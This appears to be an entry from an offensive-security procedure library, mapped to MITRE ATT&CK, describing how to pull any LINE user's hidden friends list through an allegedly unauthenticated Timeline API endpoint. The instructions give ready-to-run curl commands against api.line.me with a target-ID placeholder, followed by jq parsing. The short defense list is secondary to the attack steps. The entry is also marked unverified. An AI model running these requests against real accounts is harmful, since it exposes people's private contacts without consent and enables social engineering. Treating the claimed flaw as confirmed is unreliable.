---
id: proc-uuid-2
tags:
  - access-bypass
  - data-exfil
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-hidden-friends-retrieve]]'
verified: false
platforms:
  - Web
  - Mobile API
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:20.934Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Retrieve-Hidden-Friends-List-Using-Target-User-ID

## Summary

This procedure exploits the identified LINE Timeline API endpoint by supplying an arbitrary user's internal ID to retrieve their hidden friends list, bypassing authorization and exposing private social connections.

## Description

Once the vulnerable endpoint is known, attackers specify a target user's internal ID (obtainable via other LINE features like public profiles) in the API query. The server fails to validate the requester's permissions, returning the full list of hidden contacts. This reveals users' privacy choices and enables social engineering or graph analysis. The attack requires no credentials and works over standard HTTPS.

## Requirements

1. Target user's internal ID
2. HTTP client for API requests
3. Parser for JSON responses (e.g., jq)

## Defense

Defensive measures and detection strategies:

- Require user-specific tokens for all API calls
- Log and alert on requests with mismatched user IDs
- Use input validation to restrict ID parameters to authenticated users

## Objectives

1. Fetch hidden friends data for any specified user
2. Expose social graph elements
3. Demonstrate privacy impact

## Instructions

### Step 1: Obtain Target User ID

**Context**: Enumerate or guess the target's internal ID from public LINE data.

No specific command; use app inspection or known IDs.

### Step 2: Send Exploitation Request

**Context**: Query the endpoint with the target ID to retrieve data.

**Command** ([[commands/curl-hidden-friends-retrieve]]):
```bash
curl -X GET "https://api.line.me/v2/timeline/hidden_friends?user_id=TARGET_INTERNAL_ID" -H "Accept: application/json"
```

> This retrieves the JSON list. Expected output: {"hidden_friends": [{"id": "user123", "name": "Hidden Contact"}, ...]}, confirming unauthorized access.

### Step 3: Parse and Analyze Response

**Context**: Extract usable data from the response.

**Command** ([[commands/curl-hidden-friends-retrieve]]):
```bash
curl -s -X GET "https://api.line.me/v2/timeline/hidden_friends?user_id=TARGET_INTERNAL_ID" -H "Accept: application/json" | jq '.hidden_friends[] | {id, name}'
```

> Filters to key fields. Success: List of hidden contacts printed.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-hidden-friends-retrieve]]

## Tools Used


## Tags

- [[access-bypass]]
- [[data-exfil]]
